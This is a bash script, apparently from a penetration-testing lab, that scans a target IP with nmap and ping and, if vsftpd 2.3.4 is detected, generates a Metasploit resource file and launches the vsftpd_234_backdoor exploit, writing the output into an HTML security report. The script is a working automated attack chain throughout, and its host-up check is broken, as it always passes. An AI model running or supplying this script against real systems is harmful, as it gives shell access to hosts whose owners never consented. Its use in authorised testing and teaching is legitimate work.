#!/bin/bash

: '
#EXAMPLE: ./vsftpdscan.sh 10.0.2.4 First_Name Last_Name
'

echo "#1 Setting Constants"

FIRST_NAME=$2
LAST_NAME=$3
TESTER_NAME="$FIRST_NAME $LAST_NAME"
TITLE="Security Report By: $TESTER_NAME"
RIGHT_NOW=$(date +"%x %r %Z")
TIME_STAMP="Updated on $RIGHT_NOW by $TESTER_NAME"
TARGET_IP=$1

echo "------------------------------" >&2

function target_info()
{
    echo "<h2>Target IP Address</h2>"
    echo "<pre>"
    echo "IP Address: " $TARGET_IP
    echo "</pre>"
}   # end of target_info

function target_os()
{
    echo "<h2>System Operating System</h2>"
    echo "<pre>"
    sudo nmap $TARGET_IP -O | grep "OS details:"
    echo "</pre>"

}   # end of target_os

function target_ping()
{
    echo "<h2>Target Ping Response</h2>"
    echo "<pre>"
    ping $TARGET_IP -c 4 

    echo "</pre>"
}   # end of target_ping

function target_ports_open()
{
    # Runs only if host is up
    up="$(target_ping | grep '4 received')"
    if [ "$up'=='" ]; then
        echo "<h2>Ports open</h2>"
        echo "<pre>"
        nmap $TARGET_IP -sV | grep "open"


        echo "</pre>"
    fi

}   # end of target_ports_open

function target_attack_vsftpd()
{  
    echo "<h2>Exploits</h2>"
        if target_ports_open | grep "vsftpd 2.3.4"; then
            exploit_vsftpd
        else
            echo "Remote Host does not contain vsftpd vulnerability"
        fi
}   # end of target_attack_vsftpd


function exploit_vsftpd()
{
    $(echo "#7 Launch Exploit!" >&2)

    echo "use exploit/unix/ftp/vsftpd_234_backdoor" > vsftpd.rc
    echo "set RHOST $TARGET_IP" >> vsftpd.rc
    echo "exploit -z" >> vsftpd.rc
    echo "exit -y" >> vsftpd.rc
    echo "<h3>Results of Vsftpd exploit attempt on target</h3>"
    echo "<pre>"
    msfconsole -r vsftpd.rc
    echo "</pre>"
}   # end of exploit_vsftpd

function write_html()
{
echo "<html>
    <head>
        <title>$TITLE</title>
    </head>
    <body>
        <h1>$TITLE</h1>
        <p>$TIME_STAMP</p>
        $(echo "#2 Gathering Target Information" >&2)
        $(target_info)
        $(echo "------------------------------" >&2)
        $(echo "#3 Discovering Target Operating System" >&2)
        $(target_os)
        $(echo "------------------------------" >&2)
        $(echo "#4 Initiating Target Connectivity Test" >&2)
        $(target_ping)
        $(echo "------------------------------" >&2)
        $(echo "#5 Checking for Ports Open" >&2)
        $(target_ports_open)
        $(echo "------------------------------" >&2)
        $(echo "#6 Checking for vulnerability" >&2)
        $(target_attack_vsftpd)
        <h1>END OF REPORT</h1>
"
}

if [ $# -eq 0 ]; then
    echo "Please supply target IP address: ./vsftpdscan [Target IP] [First_Name] [Last_Name]"
    echo "Example: ./vsftpdscan 10.0.2.4 John Doe"
elif [ $# -eq 1 ]; then
    echo "Please supply your first name: ./vsftpdscan [Target IP] [First_Name] [Last_Name]"
    echo "Example: ./vsftpdscan 10.0.2.4 John Doe"
elif [ $# -eq 2 ]; then
    echo "Please supply your last name: ./vsftpdscan [Target IP] [First_Name] [Last_Name]"
    echo "Example: ./vsftpdscan 10.0.2.4 John Doe"
else
    write_html > SecurityReport-$TARGET_IP.html
    firefox SecurityReport-$TARGET_IP.html &
    exit
fi